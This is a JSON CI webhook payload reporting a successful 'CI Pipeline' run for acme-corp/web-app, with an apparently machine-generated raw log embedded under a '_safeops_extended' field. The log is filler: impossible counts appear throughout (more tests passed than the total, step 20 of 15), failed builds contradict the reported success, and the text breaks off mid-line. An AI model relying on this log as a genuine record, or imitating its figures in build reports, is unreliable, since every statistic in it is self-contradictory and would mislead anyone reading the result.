{
  "action": "completed",
  "workflow_run": {
    "id": 287,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "ce68db845bedbb2cc70731e4604a2e777f689eca",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-30T12:18:24.819312Z",
    "updated_at": "2025-11-30T12:21:44.434954Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 2/21: Running migrations\nCoverage: 93% statements, 60% branches\nInstalling axios@2.13.4\nTransforming 216 files...\nOptimizing 14 modules...\nCompiling lib/service.java...\nStep 17/18: Running migrations\nStep 3/19: Building\nUsing Node.js 14.18.4\n[12:18:24] WARN: Deprecated API usage\nHEAD is now at 31174ff\nMinifying app.js\nWARNING: express has known vulnerabilities\nFinished.\nReady.\n[12:18:24] WARN: Deprecated API usage\nHEAD is now at 19ef845\nDone.\nBuilding Docker image...\n\u2713 Step 'test' succeeded\nStep 11/17: Running migrations\nCache invalidated: node_modules\nGET /status - 204 (94ms)\nTransforming 614 files...\nException: NullPointerException\nPulling image: node:latest\nLoading...\nOptimizing 74 modules...\nOptimizing 76 modules...\nSuccess!\nStep 20/15: Installing dependencies\nFinished.\nnpm install: resolved 663 packages\nCache hit for key-3161\nStep 4/15: Running migrations\nStep 4/18: Testing\n  PASS: unit/test_api_health.spec.js\nVerifying...\nSnapshots: 21 passed, 30 total\nEnvironment: test\nSwitched to branch 'hotfix/task-392'\nDone.\nUsing Node.js 17.6.3\n[12:18:24] DEBUG: Loading configuration\nInstalling prettier@2.17.6\nInstalling react@3.2.7\nTransforming 591 files...\nStep 18/25: Deploying\nSwitched to branch 'hotfix/task-938'\nWaiting...\n[12:18:24] WARN: Deprecated API usage\nyarn add: Done in 19.21s\nSwitched to branch 'bugfix/task-736'\nVerifying...\nUploading artifact 'coverage' (38 files)\nException: TypeError\nDone.\nUsing Node.js 19.2.9\nConnecting to acme.corp:443...\nCreating production build...\nWaiting...\nChecking out master branch\nImage pulled successfully\nCompleted.\nFAILED: test_user_create\nWARNING: webpack has known vulnerabilities\nTests: 178 passed, 144 total\nCache hit for key-8448\n[12:18:24] INFO: Starting build process\nMinifying vendor.js\nArtifact uploaded: build.tar.gz (23MB)\nTLS handshake completed\nWARNING: react has known vulnerabilities\nHEAD is now at 49e8228\nStep 7/21: Installing dependencies\nGenerating source maps...\nCompiling src/service.java...\n\u2713 package completed\nStep 1/22: Building\nOK\n[12:18:24] DEBUG: Initializing service\nLoading...\nTests: 464 passed, 376 total\nWARNING: lodash has known vulnerabilities\nnpm notice: package.json updated\nDone.\npip: Downloading prettier-2.17.tar.gz\nCache miss for key-7749\n[12:18:24] INFO: Connecting to database\nFinished.\nSuccess!\nOptimizing 87 modules...\nWARNING: eslint has known vulnerabilities\nNODE_ENV=production\nTime: 19.597s\nStep 7/21: Linting\n\u2713 All checks passed\nUsing Python 3.11\nCompiling components/utils.go...\nCompiling lib/app.ts...\nCompiling components/service.java...\nnpm notice: package.json updated\nOptimizing 89 modules...\n[12:18:24] DEBUG: Memory usage: 946MB\nLayer 4/11: COPY command\n\u2713 Task completed in 2936ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out develop branch\nPushing to registry...\nnpm notice: package.json updated\n  PASS: unit/test_user_create.spec.js\nWARNING: jest has known vulnerabilities\n\u2717 build failed with exit code 58\nPOST /data - 200 (154ms)\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: added 69 packages\nInstalling prettier@4.4.5\n[12:18:24] WARN: Deprecated API usage\nHEAD is now at 8c052f5\n[12:18:24] INFO: Processing request\nGET /api - 201 (87ms)\n\u2717 build failed with exit code 20\n[12:18:24] INFO: Connecting to database\n[12:18:24] INFO: Processing request\nHEAD is now at 5b82f77\n\u2713 All checks passed\nAlready up to date.\nStep 11/19: Testing\n[12:18:24] INFO: Connecting to database\nCache hit for key-6135\nnpm install: added 449 packages\nCompleted.\n[12:18:24] WARN: Deprecated API usage\nStep 6/25: Deploying\npip: Installing build dependencies...\nTest Suites: 47 passed, 27 total\nUploading artifact 'build' (27 files)\nWARNING: react has known vulnerabilities\nFetching submodules...\nUsing Python 3.9\nCompiling lib/utils.go...\npip: Installing build dependencies...\nWARNING: eslint has known vulnerabilities\nNODE_ENV=development\n=== Step setup_environment completed ===\n=== Step: integration_tests ===\n[12:18:24] INFO: Starting build process\nEnvironment: staging\nUsing Node.js 15.6.10\nCompiling lib/utils.go...\n[12:18:24] DEBUG: Loading configuration\n[12:18:24] INFO: Processing request\nWARNING: axios has known vulnerabilities\nUploading artifact 'dist' (17 files)\n[12:18:24] DEBUG: Initializing service\nDone.\n  PASS: integration/test_db_connect.spec.js\nLoading...\nCompleted.\n  PASS: e2e/test_auth_login.spec.js\nSnapshots: 30 passed, 25 total\nTime: 53.49s\nImage pulled successfully\nCache restored successfully (145MB)\n[12:18:24] DEBUG: Initializing service\n[12:18:24] DEBUG: Query executed in 48ms\nException: TypeError\nCoverage: 85% statements, 76% branches\nPulling image: alpine:latest\nStep 9/25: Linting\nPOST /api - 202 (253ms)\n\u2713 test completed\n[12:18:24] INFO: Processing request\nPOST /upload - 202 (168ms)\npip: Downloading react-3.13.tar.gz\nConnecting to startup.dev:443...\nRan 94 tests in 4s\nWARNING: eslint has known vulnerabilities\npip: Collecting axios\nCompiling src/service.java...\nCache hit for key-9782\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Installing build dependencies...\n[12:18:24] ERROR: Connection failed\nOptimizing 55 modules...\nStep 15/21: Testing\nArtifact uploaded: build.tar.gz (19MB)\nyarn add: Done in 8.50s\nProcessing...\n[12:18:24] WARN: Deprecated API usage\nCache hit for key-6633\nCache restored successfully (310MB)\nCache saved successfully\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 Step 'test' succeeded\nEnvironment: test\nnpm install: added 244 packages\n[12:18:24] DEBUG: Memory usage: 871MB\nUsing Node.js 18.11.2\nLayer 9/10: COPY command\n  PASS: test_auth_login (388ms)\nNODE_ENV=development\nSnapshots: 43 passed, 45 total\nChecking out develop branch\nRan 180 tests in 31s\nStep 19/17: Running migrations\nTransforming 822 files...\n\u2713 Task completed in 625ms\nPlatform: win32-x64\nEnvironment: development\n[12:18:24] DEBUG: Loading configuration\nProcessing...\n[12:18:24] INFO: Connecting to database\nOptimizing 11 modules...\nPOST /data - 201 (461ms)\nCompiling lib/utils.go...\nCompiling components/main.py...\nPushing to registry...\nCache miss for key-9868\nLayer 9/9: RUN command\nUsing Python 3.9\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading react-5.14.tar.gz\npip: Installing build dependencies...\n[12:18:24] INFO: Processing request\nMinifying vendor.js\n  PASS: unit/test_db_connect.spec.js\nConnection established\n\u2713 Step 'build' succeeded\nCache miss for key-6932\nProcessing...\nUploading artifact 'dist' (12 files)\nUsing Python 3.9\n  PASS: unit/test_cache_hit.spec.js\nArtifact uploaded: build.tar.gz (14MB)\nPulling image: alpine:3.11\nCoverage: 83% statements, 88% branches\n  PASS: test_user_create (471ms)\nOptimizing 74 modules...\nnpm install: added 334 packages\npip: Installing build dependencies...\nException: RuntimeError\nnpm notice: package.json updated\nArtifact downloaded: 38MB\nLayer 4/13: RUN command\nWARNING: webpack has known vulnerabilities\nCompiling components/utils.go...\nCompleted.\n[12:18:24] INFO: Cache refreshed\nSuccess!\nLayer 2/13: ENV command\nGenerating source maps...\nGenerating source maps...\nTime: 89.430s\n\u2713 All checks passed\n[12:18:24] INFO: Cache refreshed\nSuccess!\nStep 7/25: Deploying\nSuccess!\nStep 9/24: Building\nCache saved successfully\n\u2713 lint completed\nImage pulled successfully\nLayer 9/10: COPY command\nStep 12/20: Installing dependencies\nGenerating source maps...\n[12:18:24] DEBUG: Connection pool: 6 active\n[12:18:24] WARN: Deprecated API usage\n  PASS: unit/test_db_connect.spec.js\npip: Collecting eslint\nOptimizing 18 modules...\nArtifact uploaded: dist.zip (88MB)\nTime: 27.300s\nTests: 477 passed, 153 total\nGenerating source maps...\nFetching submodules...\nCompiling components/service.java...\n\u2717 build failed with exit code 87\nFetching submodules...\n\u2713 All checks passed\nCompiling src/index.js...\nDone.\n[12:18:24] INFO: Cache refreshed\nNODE_ENV=development\nMinifying app.js\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed jest-3.13\n\u2713 All checks passed\n[12:18:24] INFO: Request completed\nUsing Python 3.11\nUploading artifact 'dist' (9 files)\n=== Step integration_tests completed ===\n=== Step: checkout ===\n  PASS: test_cache_hit (55ms)\nLayer 5/10: ENV command\nFinished.\nTests: 397 passed, 209 total\nStep 16/17: Testing\nInstalling jest@1.14.4\nAlready up to date.\nCreating production build...\nCoverage: 93% statements, 95% branches\nWaiting...\n\u2713 All checks passed\n[12:18:24] INFO: Cache refreshed\n[12:18:24] INFO: Request completed\nCreating production build...\nCache hit for key-7000\nLoading...\nException: NullPointerException\nUploading artifact 'dist' (45 files)\nInstalling react@2.17.1\nBundling styles.css\nCompleted.\n  PASS: test_db_connect (213ms)\nBundling styles.css\nCache miss for key-8949\n\u2713 Step 'build' succeeded\n[12:18:24] INFO: Connecting to database\nUsing Python 3.11\nPOST /api - 201 (81ms)\nFetching submodules...\nCreating production build...\nConnection established\nPlatform: darwin-arm64\nnpm notice: package.json updated\nnpm install: added 470 packages\n[12:18:24] DEBUG: Initializing service\nPOST /data - 201 (500ms)\n[12:18:24] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\nCompiling lib/main.py...\nReady.\nWARNING: axios has known vulnerabilities\nCache invalidated: build\nCreating production build...\n[12:18:24] DEBUG: Initializing service\n[12:18:24] DEBUG: Memory usage: 1927MB\n[12:18:24] DEBUG: Initializing service\nTest Suites: 25 passed, 5 total\nUsing Node.js 18.17.7\nTests: 56 passed, 430 total\npip: Installing build dependencies...\nSnapshots: 34 passed, 32 total\nPushing to registry...\nGET /health - 201 (44ms)\nWARNING: prettier has known vulnerabilities\nWARNING: react has known vulnerabilities\nAlready up to date.\nPulling image: python:latest\n  PASS: integration/test_user_create.spec.js\n[12:18:24] DEBUG: Initializing service\n[12:18:24] INFO: Processing request\nTransforming 372 files...\nGenerating source maps...\nChecking out develop branch\nCache miss for key-9526\nnpm install: resolved 769 packages\nStep 10/24: Building\n[12:18:24] INFO: Cache refreshed\nLayer 8/13: ENV command\nEnvironment: test\npip: Collecting lodash\nCompiling utils/service.java...\npip: Collecting eslint\nCompiling src/index.js...\nCompiling lib/main.py...\n[12:18:24] WARN: Deprecated API usage\n[12:18:24] WARN: Deprecated API usage\nCompiling utils/app.ts...\nLayer 9/10: ENV command\nPOST /upload - 201 (80ms)\nPushing to registry...\nStep 3/17: Testing\n[12:18:24] WARN: Deprecated API usage\nTime: 69.532s\nOptimizing 72 modules...\n[12:18:24] DEBUG: Query executed in 58ms\nRan 104 tests in 21s\nPlatform: darwin-arm64\nCache invalidated: dependencies\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 84% statements, 75% branches\nTransforming 947 files...\nCompiling utils/app.ts...\nInstalling axios@3.15.8\nCache saved successfully\nArtifact uploaded: build.tar.gz (32MB)\n[12:18:24] INFO: Processing request\nCoverage: 82% statements, 94% branches\nCompiling src/service.java...\nCache miss for key-2275\nStep 6/19: Building\nStep 3/20: Building\nPlatform: win32-x64\nArtifact downloaded: 12MB\nFAILED: test_api_health\nRan 57 tests in 50s\nInstalling lodash@4.14.7\nPOST /api - 202 (275ms)\npip: Collecting axios\nCreating production build...\n\u2713 All checks passed\nCompleted.\nSnapshots: 9 passed, 42 total\nCompiling lib/service.java...\nSuccess!\nNODE_ENV=test\nStep 15/25: Building\n[12:18:24] DEBUG: Initializing service\n\u2713 package completed\nVerifying...\nWaiting...\nInstalling axios@4.20.10\nCache hit for key-9501\nImage pulled successfully\npip: Collecting lodash\nConnecting to test.io:443...\nBuilding Docker image...\n[12:18:24] WARN: Deprecated API usage\nCompleted.\nAlready up to date.\npip: Collecting eslint\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 17/18: Installing dependencies\nPOST /data - 200 (129ms)\nCompiling lib/service.java...\n[12:18:24] DEBUG: Query executed in 13ms\nFAILED: test_api_health\n\u2713 Task completed in 2283ms\nCoverage: 86% statements, 60% branches\nRan 196 tests in 39s\n[12:18:24] INFO: Processing request\n[12:18:24] DEBUG: Connection pool: 18 active\nConnecting to test.io:443...\nEnvironment: development\n\u2713 Step 'setup' succeeded\nnpm install: resolved 1907 packages\n=== Step checkout completed ===\n=== Step: e2e_tests ===\nPOST /data - 202 (167ms)\n[12:18:24] WARN: Deprecated API usage\n[12:18:24] DEBUG: Query executed in 86ms\nSuccess!\nNODE_ENV=test\nSwitched to branch 'feature/task-790'\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nUsing Node.js 16.19.7\nNODE_ENV=test\nConnecting to cloud.services:443...\nConnecting to acme.corp:443...\nCache invalidated: dependencies\nDone.\nSnapshots: 38 passed, 29 total\nUploading artifact 'coverage' (37 files)\nDone.\nCompiling components/utils.go...\nChecking out master branch\nnpm install: resolved 1351 packages\n[12:18:24] INFO: Starting build process\nUsing Node.js 16.3.4\nProcessing...\nCache saved successfully\nTime: 106.804s\n[12:18:24] INFO: Request completed\nWARNING: eslint has known vulnerabilities\nException: NullPointerException\nVerifying...\nPlatform: win32-x64\n[12:18:24] INFO: Processing request\nLayer 5/11: COPY command\n[12:18:24] DEBUG: Initializing service\n[12:18:24] DEBUG: Loading configuration\nCache invalidated: build\nCompiling utils/service.java...\nTests: 80 passed, 491 total\n[12:18:24] ERROR: Connection failed\nWaiting...\nReady.\npip: Collecting webpack\nUsing Python 3.12\nWARNING: lodash has known vulnerabilities\n\u2713 All checks passed\nPushing to registry...\nImage pulled successfully\npip install: Successfully installed express-4.12\nPushing to registry...\nAlready up to date.\nCache hit for key-8832\nFetching submodules...\n[12:18:24] ERROR: Connection failed\npip install: Successfully installed react-5.8\nCreating production build...\nUploading artifact 'build' (46 files)\nTests: 466 passed, 463 total\nConnection established\nTests: 307 passed, 476 total\nCompiling components/service.java...\nSuccess!\nWARNING: react has known vulnerabilities\nCompiling components/service.java...\nUploading artifact 'coverage' (3 files)\nCompiling src/main.py...\nTests: 435 passed, 170 total\n[12:18:24] WARN: Deprecated API usage\n[12:18:24] DEBUG: Initializing service\n[12:18:24] INFO: Request completed\nInstalling eslint@1.4.3\nProcessing...\nTests: 137 passed, 165 total\nPOST /upload - 202 (313ms)\nnpm install: resolved 1216 packages\nBuilding Docker image...\n\u2713 All checks passed\n\u2713 Task completed in 193ms\nnpm install: resolved 1491 packages\nOK\npip: Downloading lodash-1.19.tar.gz\nEnvironment: test\nEnvironment: test\npip: Installing build dependencies...\nDone.\nPlatform: win32-x64\nVerifying...\nPOST /api - 201 (455ms)\n[12:18:24] INFO: Starting build process\npip: Collecting eslint\nConnection established\n  PASS: integration/test_db_connect.spec.js\n[12:18:24] INFO: Cache refreshed\nCreating production build...\n[12:18:24] INFO: Processing request\nCompleted.\n  PASS: integration/test_api_health.spec.js\nStep 2/18: Running migrations\n[12:18:24] INFO: Cache refreshed\nWARNING: react has known vulnerabilities\npip: Collecting prettier\nVerifying...\nTLS handshake completed\nCompiling src/index.js...\n[12:18:24] INFO: Cache refreshed\nPulling image: python:3.11\nOK\nUsing Python 3.9\nWARNING: eslint has known vulnerabilities\nWaiting...\nCache invalidated: build\nArtifact uploaded: dist.zip (40MB)\npip: Installing build dependencies...\n\u2713 validate completed\nStep 5/23: Running migrations\n[12:18:24] ERROR: Connection failed\nCache restored successfully (60MB)\nWARNING: jest has known vulnerabilities\nWaiting...\nCache restored successfully (225MB)\n\u2713 Task completed in 1728ms\nUsing Python 3.11\nAlready up to date.\nOK\nGET /health - 200 (76ms)\nOK\nProcessing...\nTests: 479 passed, 446 total\n[12:18:24] INFO: Request completed\nStep 17/20: Deploying\nConnection established\nCache restored successfully (26MB)\nFetching submodules...\npip: Collecting jest\nnpm notice: package.json updated\nStep 19/21: Installing dependencies\nChecking out develop branch\nCompiling components/index.js...\n[12:18:24] DEBUG: Memory usage: 1078MB\nCoverage: 98% statements, 79% branches\n[12:18:24] DEBUG: Loading configuration\nCache restored successfully (35MB)\nCache hit for key-6892\nPlatform: win32-x64\nSnapshots: 47 passed, 42 total\nVerifying...\nCache saved successfully\nPlatform: win32-x64\nFinished.\n=== Step e2e_tests completed ===\n=== Step: unit_tests ===\nConnecting to cloud.services:443...\nCoverage: 70% statements, 67% branches\n[12:18:24] DEBUG: Memory usage: 1739MB\nImage pulled successfully\nTest Suites: 14 passed, 27 total\nTime: 41.978s\nConnection established\n  PASS: unit/test_cache_hit.spec.js\nStep 17/15: Running migrations\nCompiling src/utils.go...\nTests: 134 passed, 498 total\nLayer 7/14: COPY command\n\u2717 build failed with exit code 37\nProcessing...\nArtifact uploaded: build.tar.gz (1MB)\npip: Collecting lodash\nCache invalidated: node_modules\n[12:18:24] DEBUG: Initializing service\nWaiting...\nException: RuntimeError\nImage pulled successfully\npip: Installing build dependencies...\nHEAD is now at 4937c90\nCompiling utils/main.py...\nWARNING: eslint has known vulnerabilities\npip install: Successfully installed webpack-3.13\n[12:18:24] DEBUG: Query executed in 91ms\nException: RuntimeError\nGenerating source maps...\nnpm notice: package.json updated\n[12:18:24] DEBUG: Query executed in 36ms\n[12:18:24] DEBUG: Initializing service\n[12:18:24] WARN: Deprecated API usage\n[12:18:24] DEBUG: Connection pool: 12 active\n\u2713 Task completed in 3713ms\nSnapshots: 27 passed, 32 total\n[12:18:24] DEBUG: Loading configuration\npip: Downloading lodash-1.7.tar.gz\n\u2713 All checks passed\nLoading...\nArtifact uploaded: build.tar.gz (36MB)\nBuilding Docker image...\nTLS handshake completed\nPlatform: win32-x64\nReady.\nSuccess!\nCompiling src/main.py...\n[12:18:24] DEBUG: Memory usage: 1737MB\n[12:18:24] INFO: Connecting to database\n[12:18:24] INFO: Connecting to database\nArtifact uploaded: dist.zip (9MB)\nCache miss for key-3252\nFAILED: test_cache_hit\nStep 9/21: Testing\nAlready up to date.\nCoverage: 95% statements, 99% branches\nMinifying main.js\nnpm notice: package.json updated\nCoverage: 100% statements, 89% branches\nTests: 86 passed, 172 total\nCompiling src/service.java...\nCache restored successfully (355MB)\nStep 18/18: Testing\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTLS handshake completed\nnpm notice: created a lockfile\nAlready up to date.\nArtifact uploaded: build.tar.gz (28MB)\nEnvironment: development\nStep 2/18: Testing\nChecking out develop branch\n[12:18:24] DEBUG: Loading configuration\nCache restored successfully (149MB)\nGenerating source maps...\nnpm notice: package.json updated\n[12:18:24] INFO: Starting build process\nTransforming 672 files...\nOptimizing 75 modules...\nWARNING: express has known vulnerabilities\nCompiling src/index.js...\nTests: 304 passed, 160 total\nCompiling src/app.ts...\nWARNING: webpack has known vulnerabilities\npip: Installing build dependencies...\nCoverage: 78% statements, 87% branches\nVerifying...\nInstalling eslint@1.10.8\n\u2713 Step 'test' succeeded\n[12:18:24] INFO: Processing request\nTests: 477 passed, 261 total\nGET /health - 204 (22ms)\nRan 74 tests in 54s\nFinished.\nTests: 482 passed, 211 total\nGET /api - 200 (51ms)\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache saved successfully\nRan 21 tests in 9s\nUsing Node.js 18.13.5\nBundling vendor.css\nCache hit for key-9778\nInstalling webpack@1.9.2\nHEAD is now at 3071dcf\nnpm install: resolved 1492 packages\n[12:18:24] DEBUG: Query executed in 30ms\nCompleted.\nCompleted.\nSuccess!\nnpm install: resolved 1636 packages\nCompiling utils/service.java...\nPlatform: darwin-arm64\nConnection established\nCache miss for key-9245\nWARNING: react has known vulnerabilities\nTime: 115.500s\nGenerating source maps...\n  PASS: test_cache_hit (485ms)\nCompiling src/index.js...\nImage pulled successfully\n[12:18:24] INFO: Connecting to database\nnpm notice: package.json updated\nCompiling utils/app.ts...\nnpm notice: package.json updated\npip: Installing build dependencies...\npip: Collecting webpack\nImage pulled successfully\nCache restored successfully (318MB)\nOK\n\u2713 All checks passed\nFetching submodules...\n[12:18:24] DEBUG: Memory usage: 762MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 57\n[12:18:24] DEBUG: Connection pool: 7 active\nCache hit for key-9811\nAlready up to date.\nStep 10/22: Linting\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Python 3.9\nWaiting...\nBuilding Docker image...\nHEAD is now at 8af865d\n=== Step unit_tests completed ===\n=== Step: restore_cache ===\nyarn add: Done in 14.41s\nCache hit for key-1917\nFinished.\nPlatform: win32-x64\n[12:18:24] DEBUG: Query executed in 65ms\nUsing Node.js 17.20.5\nProcessing...\nArtifact uploaded: dist.zip (80MB)\nBuilding Docker image...\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: added 288 packages\nBundling runtime.css\nArtifact downloaded: 12MB\nPushing to registry...\nTransforming 385 files...\n  PASS: e2e/test_api_health.spec.js\nNODE_ENV=development\nConnecting to cloud.services:443...\nRan 196 tests in 9s\nnpm install: added 349 packages\nStep 16/15: Deploying\nTest Suites: 28 passed, 5 total\nBuilding Docker image...\nUploading artifact 'dist' (38 files)\nCache saved successfully\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 86% statements, 78% branches\nImage pulled successfully\nAlready up to date.\nCache hit for key-3622\nCompiling components/utils.go...\nMinifying main.js\npip: Collecting eslint\nPushing to registry...\n\u2713 Step 'build' succeeded\nLoading...\n\u2713 package completed\n[12:18:24] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 15/15: Deploying\nPlatform: linux-x64\nGET /status - 200 (52ms)\nBundling styles.js\n[12:18:24] INFO: Request completed\n[12:18:24] INFO: Starting build process\nConnecting to example.com:443...\nOptimizing 42 modules...\nConnecting to example.com:443...\nCompiling utils/app.ts...\nBundling styles.css\n[12:18:24] DEBUG: Memory usage: 1101MB\nNODE_ENV=test\nVerifying...\nStep 14/15: Deploying\nPulling image: python:3.11\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 2/8: COPY command\n[12:18:24] DEBUG: Loading configuration\nStep 4/16: Linting\nnpm install: resolved 1770 packages\nCompleted.\npip install: Successfully installed express-3.15\nCache hit for key-5261\n\u2713 package completed\nFetching submodules...\nPOST /data - 202 (301ms)\nStep 2/19: Deploying\nSnapshots: 18 passed, 39 total\nnpm notice: created a lockfile\n[12:18:24] DEBUG: Loading configuration\nPulling image: node:18\nTransforming 164 files...\n  PASS: unit/test_cache_hit.spec.js\npip: Installing build dependencies...\n\u2713 All checks passed\nCache restored successfully (87MB)\nUsing Node.js 19.15.2\nBuilding Docker image...\nCompiling src/main.py...\nnpm notice: package.json updated\nStep 14/22: Linting\n[12:18:24] WARN: Deprecated API usage\nTest Suites: 28 passed, 30 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Python 3.12\nUsing Node.js 17.8.9\nCompiling components/index.js...\n[12:18:24] DEBUG: Query executed in 28ms\nStep 10/16: Deploying\nImage pulled successfully\nCache hit for key-6599\nPlatform: win32-x64\nPulling image: alpine:latest\nNODE_ENV=development\nCache restored successfully (56MB)\nLayer 10/10: ENV command\nLayer 7/15: ENV command\nCache saved successfully\nCache miss for key-8972\n\u2717 build failed with exit code 87\n\u2713 Task completed in 4277ms\n[12:18:24] ERROR: Connection failed\nReady.\nCache miss for key-5545\n[12:18:24] WARN: Deprecated API usage\nGenerating source maps...\nConnecting to test.io:443...\nPlatform: linux-x64\nCompiling lib/handler.rs...\nGET /api - 200 (67ms)\nCache restored successfully (384MB)\n[12:18:24] DEBUG: Memory usage: 1842MB\nRan 191 tests in 43s\nBuilding Docker image...\n[12:18:24] INFO: Request completed\n  PASS: test_api_health (186ms)\nAlready up to date.\n[12:18:24] DEBUG: Memory usage: 927MB\nCache restored successfully (380MB)\nGenerating source maps...\nEnvironment: production\nOptimizing 31 modules...\nTest Suites: 25 passed, 42 total\nWARNING: lodash has known vulnerabilities\n[12:18:24] WARN: Deprecated API usage\nVerifying...\nnpm install: resolved 169 packages\nCache saved successfully\nPulling image: node:3.11\nArtifact uploaded: build.tar.gz (8MB)\nSwitched to branch 'feature/task-325'\nFetching submodules...\nBundling main.js\nCompiling utils/main.py...\nArtifact downloaded: 34MB\nNODE_ENV=production\nConnection established\nInstalling prettier@1.19.2\nStep 10/23: Installing dependencies\nVerifying...\npip install: Successfully installed eslint-1.14\nCompiling lib/app.ts...\nUsing Node.js 17.4.3\nFinished.\n=== Step restore_cache completed ===\n=== Step: save_cache ===\nTime: 58.227s\n[12:18:24] WARN: Deprecated API usage\n\u2713 Step 'setup' succeeded\nFetching submodules...\npip: Downloading express-2.12.tar.gz\nCache hit for key-7648\nTime: 33.93s\n[12:18:24] DEBUG: Query executed in 98ms\nTLS handshake completed\nStep 10/25: Testing\nUsing Python 3.11\n\u2717 build failed with exit code 62\nStep 13/15: Installing dependencies\nOptimizing 53 modules...\n[12:18:24] INFO: Processing request\nHEAD is now at 2b32236\nChecking out main branch\nCompiling lib/utils.go...\nSwitched to branch 'hotfix/task-615'\nGET /health - 204 (85ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 8/17: Linting\nOK\nPushing to registry...\nTLS handshake completed\nWaiting...\nConnecting to acme.corp:443...\nChecking out main branch\nFinished.\nCoverage: 78% statements, 89% branches\nTransforming 272 files...\n[12:18:24] WARN: Deprecated API usage\n[12:18:24] WARN: Deprecated API usage\nChecking out master branch\nSuccess!\nPlatform: darwin-arm64\nDone.\nUsing Node.js 18.16.9\nPOST /data - 202 (478ms)\nPushing to registry...\nVerifying...\nAlready up to date.\n[12:18:24] DEBUG: Connection pool: 17 active\nCompleted.\npip: Downloading express-1.2.tar.gz\nPushing to registry...\n[12:18:24] INFO: Cache refreshed\n[12:18:24] WARN: Deprecated API usage\nLoading...\n  PASS: test_api_health (192ms)\nDone.\nStep 1/18: Linting\nImage pulled successfully\nStep 11/19: Testing\nAlready up to date.\nEnvironment: development\nCache saved successfully\nCache saved successfully\nReady.\nCache restored successfully (177MB)\nWARNING: lodash has known vulnerabilities\nBundling styles.js\nEnvironment: development\nOK\nnpm install: added 433 packages\nLoading...\nArtifact downloaded: 8MB\nTest Suites: 48 passed, 36 total\n[12:18:24] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:24] DEBUG: Connection pool: 6 active\nCache restored successfully (288MB)\nUsing Node.js 18.18.1\n[12:18:24] INFO: Cache refreshed\n[12:18:24] DEBUG: Query executed in 64ms\nSwitched to branch 'hotfix/task-943'\nUsing Python 3.9\nTLS handshake completed\nFinished.\nStep 12/24: Building\nTransforming 171 files...\nBundling styles.css\n[12:18:24] DEBUG: Initializing service\nRan 91 tests in 32s\nLayer 5/9: RUN command\nConnection established\nGenerating source maps...\nCompiling lib/service.java...\n[12:18:24] INFO: Request completed\nCache hit for key-8107\nCache miss for key-5362\n[12:18:24] WARN: Deprecated API usage\npip: Installing build dependencies...\nCompiling components/app.ts...\nImage pulled successfully\nSwitched to branch 'hotfix/task-997'\nUsing Python 3.9\n[12:18:24] DEBUG: Memory usage: 1724MB\nTests: 108 passed, 263 total\nBuilding Docker image...\nNODE_ENV=development\nImage pulled successfully\nSuccess!\nCache saved successfully\nnpm notice: created a lockfile\nAlready up to date.\nCache miss for key-7498\nStep 19/16: Linting\n[12:18:24] DEBUG: Query executed in 83ms\nUploading artifact 'build' (23 files)\nWARNING: express has known vulnerabilities\nCompiling utils/main.py...\nStep 12/25: Building\nStep 10/22: Running migrations\nTransforming 399 files...\n[12:18:24] DEBUG: Memory usage: 1701MB\nStep 17/16: Building\nTests: 98 passed, 400 total\nPushing to registry...\n  PASS: e2e/test_auth_login.spec.js\nFAILED: test_cache_hit\nStep 13/24: Running migrations\nCompiling lib/handler.rs...\nSuccess!\nRan 179 tests in 50s\n[12:18:24] INFO: Processing request\nConnecting to cloud.services:443...\nCompiling lib/app.ts...\nVerifying...\npip: Installing build dependencies...\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (26MB)\nUsing Node.js 19.19.6\nUploading artifact 'dist' (50 files)\nChecking out main branch\npip: Downloading webpack-3.2.tar.gz\n[12:18:24] INFO: Processing request\nTime: 34.168s\nStep 9/21: Building\nBuilding Docker image...\nUsing Node.js 17.20.10\nLayer 6/12: RUN command\nInstalling axios@3.5.3\nLayer 7/11: RUN command\nReady.\nPulling image: alpine:3.11\n=== Step save_cache completed ===\n=== Step: lint ===\n\u2713 Task completed in 833ms\nRan 107 tests in 42s\nyarn add: Done in 12.28s\nStep 5/22: Building\nInstalling eslint@2.14.8\nTime: 16.276s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:24] ERROR: Connection failed\nWaiting...\nMinifying app.js\nTests: 320 passed, 136 total\nConnecting to cloud.services:443...\n[12:18:24] INFO: Request completed\n[12:18:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 4/22: Installing dependencies\nOK\nLayer 4/11: COPY command\nArtifact uploaded: build.tar.gz (25MB)\nFAILED: 